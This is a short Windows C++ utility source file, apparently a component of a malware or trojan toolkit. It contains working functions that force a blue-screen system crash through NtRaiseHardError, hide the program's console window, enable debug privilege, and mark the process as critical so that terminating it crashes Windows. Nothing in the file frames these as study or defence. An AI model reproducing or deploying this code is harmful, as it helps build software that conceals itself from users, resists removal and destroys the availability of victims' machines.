#include "util.h"

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponeOption, PULONG Response);

typedef VOID ( _stdcall *RtlSetProcessIsCritical ) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue, // (optional)
    IN BOOLEAN     IsWinlogon );

void Util::BSOD() {
    BOOLEAN bl;
    unsigned long response;
    RtlAdjustPrivilege(19, true, false, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
}

void Util::HideConsole() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE);
    ShowWindow(hWnd, SW_HIDE);
}

bool Util::EnablePriv(LPCTSTR lpszPriv) {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if(!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken)) {
        return FALSE;
    }

    if(!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL Util::ProtectProcess()
{
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;

    hDLL = LoadLibraryA("ntdll.dll");
    if ( hDLL != NULL )
    {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical) GetProcAddress( (HINSTANCE)hDLL, "RtlSetProcessIsCritical" );
        if(!fSetCritical) return 0;
        fSetCritical(1,0,0);
        return 1;
    } else
        return 0;
}
